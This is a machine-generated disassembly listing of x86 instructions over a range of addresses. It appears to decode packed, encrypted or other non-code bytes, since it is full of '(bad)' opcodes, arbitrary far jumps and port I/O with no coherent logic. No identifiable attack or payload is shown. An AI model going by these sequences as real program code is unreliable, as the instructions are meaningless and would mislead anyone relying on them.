  416e1e:	addr16 out 0x6a,al
  416e21:	sub    bl,BYTE PTR [ebp-0x5da83d8f]
  416e27:	aaa    
  416e28:	rol    DWORD PTR [eax-0x15],cl
  416e2b:	push   0xffffff88
  416e2d:	and    al,0x99
  416e2f:	jge    0x416e94
  416e31:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416e32:	popa   
  416e33:	mov    ebx,0x902d21bd
  416e38:	add    DWORD PTR [esi+0x7a8fead9],edx
  416e3e:	mov    ebx,0xd0ee34e8
  416e43:	lahf   
  416e44:	shl    BYTE PTR [edi+0x7f90e3b4],cl
  416e4a:	mov    bh,0x88
  416e4c:	rol    BYTE PTR [esi],0x47
  416e4f:	mov    dl,0xed
  416e51:	pop    ss
  416e52:	aas    
  416e53:	inc    esi
  416e54:	int3   
  416e55:	push   esi
  416e56:	inc    ebp
  416e57:	dec    ecx
  416e58:	cmp    esi,DWORD PTR [esi]
  416e5a:	xchg   edi,eax
  416e5b:	push   es
  416e5c:	mov    bh,BYTE PTR ds:0x4b9f3741
  416e62:	mov    bl,0xc2
  416e64:	push   eax
  416e65:	jnp    0x416e47
  416e67:	test   edx,eax
  416e69:	or     eax,0x795def2e
  416e6e:	scas   al,BYTE PTR es:[edi]
  416e6f:	mov    esp,DWORD PTR [ecx-0x26654a64]
  416e75:	int3   
  416e76:	and    eax,0xf65cdb1
  416e7b:	mov    edx,0x50acb891
  416e80:	xor    eax,DWORD PTR [edi]
  416e82:	jmp    0x416e75
  416e84:	mov    dh,0xe4
  416e86:	aad    0x17
  416e88:	sub    bh,bh
  416e8a:	or     eax,0x6820fc77
  416e8f:	mov    dl,0x0
	...
  416ef1:	add    BYTE PTR [eax],al
  416ef3:	add    BYTE PTR [edi-0x519271e7],bh
  416ef9:	(bad)  
  416efa:	(bad)  
  416efb:	fucomi st,st(0)
  416efd:	xor    eax,0xd5368eea
  416f02:	in     al,0x46
  416f04:	pop    esp
  416f05:	repnz add BYTE PTR [eax],al
  416f08:	add    al,0x1
  416f0a:	add    BYTE PTR [eax],al
  416f0c:	rol    DWORD PTR ds:0x6a039306,1
  416f12:	xor    ecx,0xc28168d
  416f18:	in     eax,0xe3
  416f1a:	into   
  416f1b:	pop    eax
  416f1c:	call   FWORD PTR [esi+0x7bd0cd54]
  416f22:	repz mov ebp,0xfcd981e6
  416f28:	add    ecx,DWORD PTR ds:0x2eb3804
  416f2e:	xchg   BYTE PTR ds:0x705f83a4,al
  416f34:	xor    ah,bl
  416f36:	inc    ebp
  416f37:	add    BYTE PTR ds:[edi+eiz*4],bh
  416f3b:	call   0x7538:0x4c96539e
  416f42:	inc    esi
  416f43:	(bad)  
  416f44:	fcomp  QWORD PTR [ecx+0x5f5dccb4]
  416f4a:	les    edi,FWORD PTR [esi]
  416f4c:	in     al,dx
  416f4d:	(bad)  
  416f4e:	fcmovnu st,st(7)
  416f50:	push   esp
  416f51:	sbb    DWORD PTR [esi],esi
  416f53:	sahf   
  416f54:	dec    ecx
  416f56:	iret   
  416f57:	cmp    DWORD PTR [ebx+0x5d],0xffffffcb
  416f5b:	daa    
  416f5c:	lock scas eax,DWORD PTR es:[edi]
  416f5e:	shl    DWORD PTR [esi-0x2c],1
  416f61:	xor    BYTE PTR [ebp+0x6db20533],cl
  416f67:	lahf   
  416f68:	mov    al,ds:0x14100b07
  416f6e:	xlat   BYTE PTR ds:[ebx]
  416f6f:	dec    edx
  416f70:	rcl    DWORD PTR [ebx+0x1e172d65],1
  416f76:	call   0x6c6b:0xc2c8cf54
  416f7d:	popa   
  416f7e:	xor    al,BYTE PTR [ebx]
  416f80:	and    ebp,DWORD PTR [esi+ebx*4]
  416f83:	out    0xd4,eax
  416f85:	dec    esi
  416f86:	rcl    DWORD PTR [edi],cl
  416f88:	jg     0x416ffd
  416f8a:	retf   0x929c
  416f8d:	mov    dh,0x86
  416f8f:	mov    esi,0xdf492be4
  416f94:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416f95:	jnp    0x416f4c
  416f97:	out    0xe0,al
  416f99:	dec    esi
  416f9a:	out    dx,al
  416f9b:	shr    eax,1
  416f9d:	jl     0x416f21
  416f9f:	sahf   
  416fa0:	pop    ebp
  416fa1:	cld    
  416fa2:	adc    DWORD PTR [edi],edx
  416fa4:	mov    esp,0xf5fdf4a2
  416fa9:	mov    ds:0xc60ee549,eax
  416fae:	mov    bh,BYTE PTR [edi]
  416fb0:	or     BYTE PTR [ebp-0x2e],bh
  416fb3:	inc    ecx
  416fb4:	jnp    0x416f36
  416fb6:	dec    edx
  416fb7:	mov    al,0xe4
  416fb9:	dec    ecx
  416fba:	xchg   esp,eax
  416fbb:	in     eax,0xf5
  416fbd:	das    
  416fbe:	cmp    BYTE PTR [edi+esi*4-0x4e1070],ch
  416fc5:	pop    esp
  416fc6:	sbb    al,0x4d
  416fc8:	mov    edi,0xac3bc71e
  416fcd:	fcom   st(3)
  416fcf:	pop    ecx
  416fd0:	add    edi,DWORD PTR [esi-0x70]
  416fd3:	add    al,0xc
  416fd5:	xor    eax,0xb1bc98d0
  416fda:	scas   eax,DWORD PTR es:[edi]
  416fdb:	fcom   DWORD PTR [ebx-0x57]
  416fde:	sbb    al,0x5a
  416fe0:	ss pop esi
  416fe2:	daa    
  416fe3:	test   eax,0x8a359608
  416fe8:	jnp    0x41700c
  416fea:	sbb    eax,0x2469ebd3
  416fef:	jge    0x416f79
  416ff1:	lahf   
  416ff2:	bound  edi,QWORD PTR [esi+ecx*4]
  416ff5:	push   edx
  416ff6:	mov    bh,0x71
  416ff8:	retf   
  416ff9:	iret   
  416ffa:	push   0xd051de85
  416fff:	lods   eax,DWORD PTR ds:[esi]
  417000:	aad    0x6
  417002:	or     al,0x8
  417004:	jge    0x417009
  417006:	pop    ebp
  417007:	fdiv   QWORD PTR [ebx]
  417009:	pusha  
  41700a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41700b:	aad    0x1
  41700d:	lods   al,BYTE PTR ds:[esi]
  41700e:	stos   BYTE PTR es:[edi],al
  41700f:	pop    ebx
	...
  417074:	jbe    0x4170a3
  417076:	push   ebp
  417077:	inc    ecx
  417078:	pop    edi
  417079:	jns    0x4170f1
  41707b:	aas    
  41707c:	(bad)  
  41707d:	loopne 0x417073
  41707f:	sub    ebp,DWORD PTR [ebp+0xf]
  417082:	xlat   BYTE PTR ds:[ebx]
  417083:	lock pusha 
  417085:	repz add BYTE PTR [eax],al
  417088:	add    al,0x1
  41708a:	add    BYTE PTR [eax],al
  41708c:	add    eax,0xc264e338
  417091:	stc    
  417092:	mov    ds:0xca377f8f,al
  417097:	out    dx,eax
  417098:	gs popa 
  41709a:	inc    eax
  41709b:	cmp    edi,DWORD PTR [ebx]
  41709d:	out    dx,eax
  41709e:	lds    edi,FWORD PTR [edx-0xba7710d]
  4170a4:	ror    DWORD PTR [eax+0x3d06757a],cl
  4170aa:	cdq    
  4170ab:	jns    0x4170b8
  4170ad:	push   ecx
  4170ae:	push   0x832e7845
  4170b3:	cmp    BYTE PTR [eax+0x579d123c],al
  4170b9:	ss push ss
  4170bb:	pop    esp
  4170bc:	adc    esp,DWORD PTR [esi+0x495788d2]
  4170c2:	mov    bh,bh
  4170c4:	stos   BYTE PTR es:[edi],al
  4170c5:	jmp    0xf271:0xd281dd8e
  4170cc:	xor    al,0xf1
  4170ce:	xchg   DWORD PTR [eax],esp
  4170d0:	mov    dh,0x33
  4170d2:	xchg   edi,eax
  4170d4:	std    
  4170d5:	fcmovnbe st,st(7)
  4170d7:	inc    edi
  4170d8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4170d9:	jg     0x417132
  4170db:	add    ch,BYTE PTR [edx-0x643ccb49]
  4170e1:	push   eax
  4170e2:	js     0x417084
  4170e4:	ror    ebp,0x8f
  4170e7:	lods   al,BYTE PTR ds:[esi]
  4170e8:	in     al,0x96
  4170ea:	aad    0x27
  4170ec:	aaa    
  4170ed:	mov    ?,WORD PTR [edi+0x545f6003]
  4170f3:	sahf   
  4170f4:	adc    bl,BYTE PTR [edi]
  4170f6:	fwait
  4170f7:	into   
  4170f8:	cmp    ah,bl
  4170fa:	imul   eax,eax,0x35914f75
  417100:	psraw  mm7,mm4
  417103:	pop    ss
  417104:	xor    bh,BYTE PTR [ebx]
  417106:	retf   
  417107:	push   0xffffff87
  417109:	sbb    ebp,esp
  41710b:	loopne 0x41710c
  41710d:	xor    al,0xee
  41710f:	repz cwde 
  417111:	retf   
  417112:	cmp    bl,ch
  417114:	and    al,0x14
  417116:	(bad)
  417119:	and    DWORD PTR es:[esi-0x6f],edx
  41711d:	sub    al,0x5e
  41711f:	mov    al,0x9e
  417121:	(bad)  
  417122:	xor    ch,bh
  417124:	fwait
  417125:	and    bl,BYTE PTR ds:0xb029b278
  41712b:	pop    eax
  41712c:	sub    BYTE PTR [esi+0x4d86fee8],cl
  417132:	dec    edi
  417133:	jl     0x4170ef
  417135:	fcomp  DWORD PTR [esi+0x72]
  417138:	fwait
  417139:	xchg   ebp,eax
  41713a:	fs dec eax
  41713c:	sbb    dl,BYTE PTR [ebp+0x4072ee4]
  417142:	add    eax,0x78c298f3
  417147:	add    cl,al
  417149:	(bad)  
  41714a:	popa   
  41714b:	jp     0x4170e7
  41714d:	inc    esp
  41714e:	ins    BYTE PTR es:[edi],dx
  41714f:	jp     0x4170d1
  417151:	mov    fs,esi
  417153:	pop    esp
  417154:	enter  0x700b,0x32
  417158:	stos   BYTE PTR es:[edi],al
  417159:	push   edx
  41715a:	xchg   DWORD PTR [ebp-0x49],edx
  41715d:	cmp    dh,al
  41715f:	or     DWORD PTR [eax+0x24080fae],0xffffffcf
  417166:	shl    DWORD PTR [ebx+0x526c1919],cl
  41716c:	jecxz  0x4171a4
  41716e:	cmp    DWORD PTR [edx+0x5f],esp
  417171:	cmp    eax,0xc89cea39
  417176:	pop    ss
  417177:	pusha  
  417178:	pushf  
  417179:	hlt    
  41717a:	add    ch,BYTE PTR [ebx+eax*2+0x6e]
  41717e:	rol    ecx,cl
  417180:	or     DWORD PTR [eax],eax
  417182:	ins    DWORD PTR es:[edi],dx
  417183:	mov    al,0x14
  417185:	bound  esi,QWORD PTR ds:0x1427cc31
  41718b:	fmul   st(3),st
  41718d:	adc    eax,0x7f6d
	...
  4171f2:	add    BYTE PTR [eax],al
  4171f4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4171f5:	sbb    DWORD PTR [eax+0x1a],esi
  4171f8:	(bad)  
  4171f9:	jnp    0x4171e9
  4171fb:	mov    ebp,0x986526a4
  417200:	retf   0x7bbb
  417203:	ja     0x417269
  417205:	hlt    
  417206:	add    BYTE PTR [eax],al
  417208:	add    al,0x1
  41720a:	add    BYTE PTR [eax],al
  41720c:	test   BYTE PTR [edi+0x1a],al
  41720f:	jbe    0x417274
  417211:	sub    ch,BYTE PTR [edx+eax*1-0x28d542bb]
  417218:	std    
  417219:	dec    esp
  41721a:	fidivr WORD PTR [eax]
  41721c:	arpl   WORD PTR [ecx],cx
  41721e:	jg     0x41722f
  417220:	(bad)  
  417221:	xor    eax,0x4ed01157
  417226:	jmp    0x4171b5
  417228:	pop    es
  417229:	xor    ch,BYTE PTR [edx+0x762bc1d6]
  41722f:	nop
  417230:	dec    BYTE PTR [edx-0x29]
  417233:	ins    DWORD PTR es:[edi],dx
  417234:	mov    DWORD PTR ds:0x4c857985,edx
  41723a:	cld    
  41723b:	fmul   DWORD PTR [edx-0x7441ecc6]
  417241:	jl     0x417293
  417243:	popa   
  417244:	cmp    BYTE PTR [edi+0x57ea93c1],ah
  41724a:	rcr    BYTE PTR [edx+0x27b57163],1
  417250:	rcr    BYTE PTR [ebx-0x547876ad],cl
  417256:	jne    0x4171e9
  417258:	jo     0x4172d9
  41725a:	add    al,0xc
  41725c:	cmp    eax,0x1c66759f
  417261:	xchg   esi,eax
  417262:	and    ah,BYTE PTR [esi+0x53e80363]
  417268:	mov    dl,0x2a
  41726a:	mov    ah,0x46
  41726c:	and    ebp,DWORD PTR [edx]
  41726e:	in     al,0x7
  417270:	fst    QWORD PTR [edi-0x3e6856a8]
  417276:	mov    dh,0xbf
  417278:	mov    ch,0x4c
  41727a:	cs scas al,BYTE PTR es:[edi]
  41727c:	xchg   ebp,eax
  41727d:	adc    BYTE PTR [edi-0xe041b3],0xa2
  417284:	inc    eax
  417285:	adc    al,0xda
  417287:	xor    al,BYTE PTR [edi-0xf]
  41728a:	stos   BYTE PTR es:[edi],al
  41728b:	sbb    esi,DWORD PTR [eax+ebp*8-0x58]
  41728f:	jle    0x417232
  417291:	jecxz  0x41728f
  417293:	mov    cl,0x51
  417295:	inc    esi
  417296:	push   ebp
  417297:	mov    edi,0xd2232cb8
  41729c:	jbe    0x4172d1
  41729e:	pop    esp
  41729f:	repnz add ch,BYTE PTR [esi+0x63ed3e6a]
  4172a6:	cmp    eax,0x22ad0036
  4172ab:	sahf   
  4172ac:	push   es
  4172ad:	xchg   ebx,eax
  4172ae:	ss mov bl,0x42
  4172b1:	unpcklps xmm6,xmm0
  4172b4:	jg     0x417306
  4172b6:	call   0xb6b1536b
  4172bb:	xchg   ebx,eax
  4172bc:	sub    dh,BYTE PTR [esp+eiz*2+0x12]
  4172c0:	adc    al,0xb4
  4172c2:	xor    eax,0xe85b751a
  4172c7:	dec    ebp
  4172c8:	push   eax
  4172c9:	jno    0x41732a
  4172cb:	push   eax
  4172cc:	xor    BYTE PTR [edi+0x15],dh
  4172cf:	xchg   ebp,eax
  4172d0:	js     0x417268
  4172d2:	pop    esp
  4172d3:	and    ebx,0xffffffb9
  4172d6:	iret   
  4172d7:	cdq    
  4172d8:	inc    edx
  4172d9:	cmovl  ecx,DWORD PTR [ebx+0x79]
  4172dd:	xlat   BYTE PTR ds:[ebx]
  4172de:	mov    ch,0xc4
  4172e0:	mov    al,0x1
  4172e2:	fistp  QWORD PTR [edx-0x5]
  4172e5:	sub    ch,BYTE PTR [esi-0x78]
  4172e8:	xchg   esi,eax
  4172e9:	lods   al,BYTE PTR ds:[esi]
  4172ea:	adc    cl,bh
  4172ec:	aaa    
  4172ed:	aas    
  4172ee:	shr    dh,0xea
  4172f1:	ss jg  0x41733f
  4172f4:	xor    cl,BYTE PTR [esi+eax*2+0x15e3a8b0]
  4172fb:	mov    bh,0xf1
  4172fd:	fadd   QWORD PTR [eax]
  4172ff:	sbb    DWORD PTR [ecx-0x1a],edi
  417302:	sub    al,0x13
  417304:	mov    edx,0xe62ee783
  417309:	adc    al,0x42
  41730b:	mov    WORD PTR [ecx],?
  41730d:	sub    BYTE PTR [ebp+0x6],dh
	...
  417374:	imul   edi,DWORD PTR [edi+edx*8-0x168028a2],0x8016bbf
  41737f:	mov    gs:0x68a9e7d8,eax
  417385:	cmc    
  417386:	add    BYTE PTR [eax],al
  417388:	add    al,0x1
  41738a:	add    BYTE PTR [eax],al
  41738c:	push   ds
  41738d:	mov    cl,0x28
  41738f:	or     bl,BYTE PTR [ecx-0x38]
  417392:	xor    DWORD PTR [ebx+0x5],ecx
  417395:	lea    edx,[ecx-0x2f]
  417398:	jae    0x41733e
  41739a:	enter  0x585b,0x4a
  41739e:	adc    ch,BYTE PTR [edx]
  4173a0:	sbb    ebx,DWORD PTR [ebx-0x38ab2e44]
  4173a6:	cmp    esi,DWORD PTR [edi+ebp*4]
  4173a9:	xor    eax,0x3ab48e9b
  4173ae:	leave  
  4173af:	pop    edx
  4173b0:	shr    BYTE PTR [ebp+0x2aabb412],cl
  4173b6:	push   0xffffffea
  4173b8:	retf   0xff88
  4173bb:	dec    eax
  4173bc:	sbb    eax,0xcb43032a
  4173c1:	out    dx,eax
  4173c2:	mov    edx,0x127ba839
  4173c7:	mov    DWORD PTR [ecx+0x5],edi
  4173ca:	cwde   
  4173cb:	jns    0x4173ad
  4173cd:	xchg   esi,eax
  4173ce:	jnp    0x417356
  4173d0:	mov    ds:0x86e9d15a,al
  4173d5:	test   al,0x43
  4173d7:	ret    
  4173d8:	popf   
  4173d9:	xor    al,0x94
  4173db:	fwait
  4173dc:	imul   edx,DWORD PTR [ebp+0x77],0xcdf7723e
  4173e3:	mov    bl,ah
  4173e5:	push   ds
  4173e6:	pop    esp
  4173e7:	inc    esi
  4173e8:	fs push ds
  4173ea:	fsubr  QWORD PTR [esi+0x12c0040a]
  4173f0:	mov    ds:0xba7a93ea,eax
  4173f5:	test   DWORD PTR [eax+0x4],edi
  4173f8:	add    DWORD PTR [edi-0x52],ebp
  4173fb:	sub    al,0x83
  4173fd:	inc    ebp
  4173fe:	mov    dl,0x9f
  417400:	mov    ah,0x6d
  417402:	push   edx
  417403:	dec    edx
  417404:	adc    bl,BYTE PTR [edx-0x44]
  417407:	push   ss
  417408:	inc    eax
  417409:	dec    DWORD PTR [ecx+0xf4924ad]
  41740f:	outs   dx,DWORD PTR ds:[esi]
  417410:	push   edx
  417411:	rcl    BYTE PTR [ebx-0x53],1
  417414:	sub    ebp,DWORD PTR [eax]
  417416:	jne    0x4173c5
  417418:	sbb    BYTE PTR [edi-0x59],al
  41741b:	sub    dl,BYTE PTR [eax-0x6ad2b91]
  417421:	loop   0x41740d
  417423:	sar    BYTE PTR [edi+0x2a],cl
  417426:	pop    ss
  417427:	fadd   QWORD PTR [ebx-0x538adcf4]
  41742d:	je     0x417456
  41742f:	call   0x5ead:0xda2aec51
  417436:	mov    bl,al
  417438:	jns    0x417467
  41743a:	inc    edi
  41743b:	push   DWORD PTR [edx-0x66]
  41743e:	xor    bl,BYTE PTR [ebp+0x3e752382]
  417444:	lock popf 
  417446:	(bad)  [ecx]
  417448:	test   DWORD PTR [esi+0x1a157145],edx
  41744e:	sti    
  41744f:	xchg   ebp,eax
  417450:	pop    edi
  417451:	cmp    ebx,DWORD PTR [ebx]
  417453:	addr16 retf 
  417455:	std    
  417456:	xor    BYTE PTR [ebx-0x3f7579e3],cl
  41745c:	mov    bh,0x89
  41745e:	dec    ebp
  41745f:	lods   eax,DWORD PTR ds:[esi]
  417460:	jne    0x417435
  417462:	sub    al,0x6c
  417464:	scas   eax,DWORD PTR es:[edi]
  417465:	mov    edx,0xde9eac13
  41746a:	mov    edi,0x16d4d47c
  41746f:	and    DWORD PTR [edx+0x7ed4cfe1],edx
  417475:	jmp    0x417424
  417477:	out    0x1c,eax
  417479:	mov    ch,0xc0
  41747b:	dec    edx
  41747c:	pop    eax
  41747d:	aad    0xe5
  41747f:	(bad)  
  417480:	imul   BYTE PTR [ecx]
  417482:	mov    BYTE PTR [edi],bh
  417484:	ret    
  417485:	xor    ah,BYTE PTR [eax+0x396cc7c5]
  41748b:	cmp    edx,DWORD PTR [edi+eax*4]
  41748e:	out    dx,eax
  41748f:	in     al,0x0
	...
  4174f1:	add    BYTE PTR [eax],al
  4174f3:	add    BYTE PTR [ecx+0x6b0c6aba],dl
  4174f9:	fdivr  st(7),st
  4174fb:	mov    edi,0x212a686b
  417500:	lea    ecx,[esi]
  417502:	mov    eax,ecx
  417504:	ins    BYTE PTR es:[edi],dx
  417505:	test   BYTE PTR [eax],0x0
  417508:	add    al,0x1
  41750a:	add    BYTE PTR [eax],al
  41750c:	dec    ebp
  41750d:	sahf   
  41750e:	mov    ecx,0xbdf114a
  417513:	aaa    
  417514:	inc    ebp
  417515:	pop    ebx
  417516:	lods   al,BYTE PTR ds:[esi]
  417517:	test   eax,0xc7f0a31
  41751c:	jnp    0x4174a8
  41751e:	push   0xb2ffef85
  417523:	arpl   WORD PTR [eax],di
  417525:	mov    eax,ds:0xe1cf1839
  41752a:	popf   
  41752b:	mov    bl,BYTE PTR [eax-0x5a]
  41752e:	into   
  41752f:	adc    BYTE PTR [esi],0xad
  417532:	push   eax
  417533:	test   al,0xff
  417535:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417536:	mov    ch,0xea
  417538:	aaa    
  417539:	ss pop ss
  41753b:	ins    DWORD PTR es:[edi],dx
  41753c:	ror    DWORD PTR [ecx-0x65],cl
  41753f:	inc    edi
  417540:	jne    0x41752b
  417542:	out    0x52,al
  417544:	jo     0x41756d
  417546:	pop    es
  417547:	sub    BYTE PTR [ebp-0x16469b33],dh
  41754d:	ss aaa 
  41754f:	test   ah,bh
  417551:	in     eax,dx
  417552:	popf   
  417553:	cmp    BYTE PTR [eax-0x25],dh
  417556:	jmp    0xc4f4b64d
  41755b:	cmp    BYTE PTR [edx-0x40774b79],cl
  417561:	jns    0x417528
  417563:	mov    gs,WORD PTR [eax-0x60]
  417566:	aas    
  417567:	jmp    0x41756e
  417569:	pusha  
  41756a:	xchg   ebx,eax
  41756b:	sub    ecx,DWORD PTR [ecx]
  41756d:	mov    DWORD PTR [ebp-0x7b],esp
  417570:	mov    cl,0xce
  417572:	mov    ch,0xfa
  417574:	mov    dl,0xf0
  417576:	sub    BYTE PTR [ecx+0x6a7b31c0],dl
  41757c:	cmp    al,0x8e
  41757e:	jp     0x417524
  417580:	push   edi
  417581:	ror    al,1
  417583:	cld    
  417584:	sbb    ch,BYTE PTR [ecx]
  417586:	ss pop edx
  417588:	fcom   QWORD PTR [edx-0x3c]
  41758b:	pop    ebp
  41758c:	ss and al,0x42
  41758f:	push   esp
  417590:	mov    ch,0x10
  417592:	xchg   edx,eax
  417593:	and    DWORD PTR [ecx],0x667f5947
  417599:	out    dx,al
  41759a:	enter  0xe249,0x36
  41759e:	js     0x4175e1
  4175a0:	pop    ds
  4175a1:	nop
  4175a2:	mov    ecx,0xc00636a2
  4175a7:	int3   
  4175a8:	pminub mm0,QWORD PTR [esi]
  4175ab:	dec    edx
  4175ac:	addr16 add dh,dh
  4175af:	push   esp
  4175b0:	pop    edx
  4175b1:	(bad)  
  4175b2:	mov    ecx,0x363b3827
  4175b7:	outs   dx,DWORD PTR ds:[esi]
  4175b8:	pop    esp
  4175b9:	test   eax,0x99b7aae1
  4175be:	out    0xb7,eax
  4175c0:	cmc    
  4175c1:	and    ch,dh
  4175c3:	inc    ecx
  4175c4:	(bad)  
  4175c5:	in     al,dx
  4175c6:	hlt    
  4175c7:	mov    al,ds:0xf24d40d0
  4175cc:	dec    esp
  4175cd:	lahf   
  4175ce:	sbb    ecx,esp
  4175d0:	cmp    DWORD PTR [ecx-0x2e],esi
  4175d3:	pop    es
  4175d4:	push   ebp
  4175d5:	inc    esi
  4175d6:	jmp    0xfe77509b
  4175db:	adc    ah,BYTE PTR [esi-0x5a50227f]
  4175e1:	adc    esi,0xffffff9b
  4175e4:	jmp    0xa20de9e2
  4175e9:	outs   dx,DWORD PTR ds:[esi]
  4175ea:	lods   eax,DWORD PTR ds:[esi]
  4175eb:	mov    dh,0x65
  4175ed:	mov    esp,0x33d4e47e
  4175f2:	pop    ebp
  4175f3:	(bad)  
  4175f4:	sub    BYTE PTR [edi+0x483263b7],ah
  4175fa:	ror    BYTE PTR [esi+0xf768ffe],1
  417600:	adc    eax,0x89472dce
  417605:	loopne 0x417588
  417607:	into   
  417608:	sahf   
  417609:	add    al,0x24
  41760b:	aaa    
  41760c:	lock pop ds
  41760e:	in     al,0x76
	...
  417674:	test   eax,0xdf4fd367
  417679:	(bad)  
  41767a:	mov    ebp,0x411f24e7
  41767f:	fimul  DWORD PTR [eax+0x6d]
  417682:	pop    esp
  417683:	cmp    BYTE PTR [eax-0x9],dh
  417686:	add    BYTE PTR [eax],al
  417688:	add    al,0x1
  41768a:	add    BYTE PTR [eax],al
  41768c:	dec    ebp
  41768d:	nop
  41768e:	pushf  
  41768f:	clc    
  417690:	outs   dx,DWORD PTR ds:[esi]
  417691:	jp     0x417656
  417693:	dec    ebp
  417694:	js     0x4176f1
  417696:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417697:	xchg   ebx,eax
  417698:	pop    ds
  417699:	mov    esi,0xe501707a
  41769e:	mov    ds:0x52ec272b,al
  4176a3:	sub    al,0xce
  4176a5:	ins    BYTE PTR es:[edi],dx
  4176a6:	xchg   dh,dl
  4176a8:	shl    BYTE PTR [ebx+eiz*8-0x1e9ba9b7],1
  4176af:	add    DWORD PTR [ecx+0x32],ebx
  4176b2:	cmp    DWORD PTR [ebp-0x38e070dd],0xedee3ec3
  4176bc:	aas    
  4176bd:	mov    ?,WORD PTR [edi+0x4a]
  4176c0:	pop    es
  4176c1:	push   ds
  4176c2:	out    0xaa,eax
  4176c4:	sbb    eax,0x23d697d9
  4176c9:	dec    esi
  4176ca:	and    cl,bl
  4176cc:	loop   0x417687
  4176ce:	sbb    ecx,0xb83bfaba
  4176d4:	sbb    al,0xba
  4176d6:	retf   
  4176d7:	dec    edi
  4176d8:	adc    BYTE PTR [edi],0x69
  4176db:	ja     0x417727
  4176dd:	test   al,0x7
  4176df:	into   
  4176e0:	out    dx,al
  4176e1:	mov    cl,0x7b
  4176e3:	push   edi
  4176e4:	mov    ecx,0x681d5be6
  4176e9:	dec    edi
  4176ea:	or     al,0xd7
  4176ec:	lahf   
  4176ed:	test   eax,0x157bfc0a
  4176f2:	fwait
  4176f3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4176f4:	mov    ebp,0xc88fd7a7
  4176f9:	cwde   
  4176fa:	pop    eax
  4176fb:	mov    ds:0x60a4a5fd,al
  417700:	repz daa 
  417702:	sahf   
  417703:	mov    bl,0xce
  417705:	ins    DWORD PTR es:[edi],dx
  417706:	cmp    cl,BYTE PTR [edx+0x13e8f1b7]
  41770c:	aas    
  41770d:	rcl    BYTE PTR [edi+0x4a],0x63
  417711:	nop
  417712:	or     ebx,DWORD PTR [edi+eax*8+0x5927701d]
  417719:	hlt    
  41771a:	push   esp
  41771b:	addr16 cdq 
  41771d:	rcr    DWORD PTR [ebx],cl
  41771f:	scas   eax,DWORD PTR es:[edi]
  417720:	(bad)  
  417722:	mov    ds:0x9e24faff,al
  417727:	jo     0x41771b
  417729:	ret    0x6424
  41772c:	shr    DWORD PTR [esp+eiz*4],cl
  41772f:	fimul  DWORD PTR [esi-0x3f]
  417732:	jg     0x4176d3
  417734:	adc    ebx,DWORD PTR [edx-0x749f7866]
  41773a:	mov    eax,ds:0xa35b1d4b
  41773f:	or     DWORD PTR [edi-0x70],0x93dd46b0
  417746:	icebp  
  417747:	xor    bl,BYTE PTR [esp+ecx*1-0x51e83362]
  41774e:	mov    cl,0x1f
  417750:	inc    ebx
  417751:	jns    0x41777f
  417753:	in     eax,dx
  417754:	(bad)  
  417755:	aad    0xcc
  417757:	push   esp
  417758:	test   al,0x91
  41775a:	inc    ebx
  41775b:	jne    0x417707
  41775d:	inc    esp
  41775e:	dec    esp
  41775f:	mov    bl,0x4c
  417761:	repz sar BYTE PTR [edx],0xef
  417765:	repnz les edi,FWORD PTR [ebp+0x28ee58e4]
  41776c:	js     0x4177bc
  41776e:	daa    
  41776f:	popa   
  417770:	loop   0x417717
  417772:	test   DWORD PTR [eax+0x38],ebx
  417775:	fld    DWORD PTR [edx+ebx*2+0x9]
  417779:	clc    
  41777a:	sbb    al,0xa7
  41777c:	shr    BYTE PTR [ebx],1
  41777e:	cld    
  41777f:	push   es
  417780:	cmp    al,bh
  417782:	(bad)  
  417784:	mov    ch,0xbd
  417786:	js     0x41776f
  417788:	cli    
  417789:	dec    ebx
  41778a:	mov    dl,0x1b
  41778c:	or     eax,0x91bde
	...
  4177f1:	add    BYTE PTR [eax],al
  4177f3:	add    cl,ch
  4177f5:	push   cs
  4177f6:	(bad)  
  4177f7:	pop    ss
  4177f8:	push   edi
  4177fa:	jmp    0x233417fd
  4177ff:	sar    BYTE PTR [ebx+ebp*8-0xf],cl
  417803:	outs   dx,DWORD PTR ds:[esi]
  417804:	je     0x4177fe
  417806:	add    BYTE PTR [eax],al
  417808:	add    al,0x1
  41780a:	add    BYTE PTR [eax],al
  41780c:	push   edi
  41780d:	inc    edi
  41780e:	ss xchg ebp,eax
  417810:	cmc    
  417811:	daa    
  417812:	es popa 
  417814:	mul    ebp
  417816:	leave  
  417817:	push   esp
  417818:	inc    edx
  417819:	add    al,0x8c
  41781b:	xchg   edi,eax
  41781c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41781d:	mov    ecx,0x576d231
  417822:	dec    edi
  417823:	and    BYTE PTR ds:0x87cae33f,al
  417829:	or     al,0x28
  41782b:	pop    ds
  41782c:	cmp    cl,BYTE PTR [eax-0x6341a4d6]
  417832:	mov    WORD PTR [edi],ds
  417834:	mov    al,BYTE PTR [esi+0x72fe0691]
  41783a:	dec    edi
  41783b:	push   ebp
  41783c:	inc    ebp
  41783d:	(bad)  
  41783e:	popa   
  41783f:	jl     0x4177d8
  417841:	fisub  WORD PTR [esi]
  417843:	push   esi
  417844:	loope  0x41783c
  417846:	leave  
  417847:	(bad)  
  417848:	loopne 0x4178ab
  41784a:	in     eax,0xc8
  41784c:	nop
  41784d:	xor    al,0xbf
  41784f:	xor    BYTE PTR [ebx-0x15b0e2b5],ch
  417855:	xchg   ebp,eax
  417856:	add    al,0x23
  417858:	rcl    BYTE PTR [esi],cl
  41785a:	into   
  41785b:	adc    esp,DWORD PTR [ecx-0x43491944]
  417861:	sbb    esi,DWORD PTR [si]
  417864:	and    BYTE PTR [esi],dl
  417866:	dec    esi
  417867:	and    dl,BYTE PTR [edx+0x1530acbd]
  41786d:	cmp    ebx,DWORD PTR [ebx]
  41786f:	sbb    BYTE PTR [ebx+esi*4],cl
  417872:	mov    bh,0xd4
  417874:	jge    0x417851
  417876:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417877:	sub    BYTE PTR [edi+0x55],0x89
  41787b:	cmp    edi,0xffffffa9
  41787e:	xchg   eax,ebx
  417880:	icebp  
  417881:	fxch   st(6)
  417883:	push   ebx
  417884:	stos   DWORD PTR es:[edi],eax
